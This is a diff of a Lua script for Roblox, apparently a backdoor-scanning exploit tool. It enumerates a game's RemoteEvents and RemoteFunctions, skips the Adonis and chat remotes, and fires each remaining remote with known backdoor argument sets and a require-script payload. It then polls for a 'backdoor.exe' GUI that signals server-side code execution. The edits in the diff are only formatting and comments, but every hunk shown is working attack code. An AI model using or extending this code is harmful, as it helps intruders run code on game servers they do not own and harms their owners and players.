@@ -15,6 +15,7 @@
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ]]
+
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local JointsService = game:GetService("JointsService")
@@ -50,13 +51,15 @@ end
 
 local function attached(possibleWait)
 	local PlayerGui =  LocalPlayer.PlayerGui
+    
 	if possibleWait then
 		local start = dateTimeNow().UnixTimestampMillis
-		local possibleWait = possibleWait*1000
+		local possibleWait = possibleWait * 1000
 		while PlayerGui and not PlayerGui:FindFirstChild("backdoor.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
 			taskWait()
 		end
 	end
+
 	return PlayerGui and PlayerGui:FindFirstChild("backdoor.exe")
 end
 
@@ -69,7 +72,11 @@ local function validRemote(rm)
 
 	if Parent then
 		if Parent == JointsService then return false end
-		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+        
+        -- Addonis Check
+		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+        (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+
 		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
 	end
 
@@ -115,34 +122,43 @@ local function scanGame()
 		for index=1, #DescendantsList do
 			if attached() then break end
 			local remote = DescendantsList[index]
+
 			if not validRemote(remote) then continue end
 			if remote.ClassName ~= "RemoteEvent" then continue end
+
 			if emmaBackdoor(remote) then
 				remote:FireServer(unpack(alternativeSS.emma), requireScript)
 			end
 			if not attached() and runBackdoor(remote) then
 				remote:FireServer(unpack(alternativeSS.run), requireScript)
 			end
+
 			if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
 			if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
 			if not attached() then remote:FireServer(requireScript) end
 
 		end
 		if attached() then return end
+
 		for index=1, #DescendantsList do
 			if attached() then break end
 			local remote = DescendantsList[index]
+
 			if not validRemote(remote) then continue end
 			if remote.ClassName ~= "RemoteFunction" then continue end
+
 			local waiting = true
 			taskSpawn(function()
 				remote:InvokeServer(requireScript)
 				waiting = nil
 			end)
+
+            -- If RemoteFunction don't respond in 1 second, we skip this one.
 			local start = dateTimeNow().UnixTimestampMillis
-			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do -- If RemoteFunction don't respond in 1 second, we skip this one.
+			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
 				taskWait()
 			end
+
 		end
 	end
 end
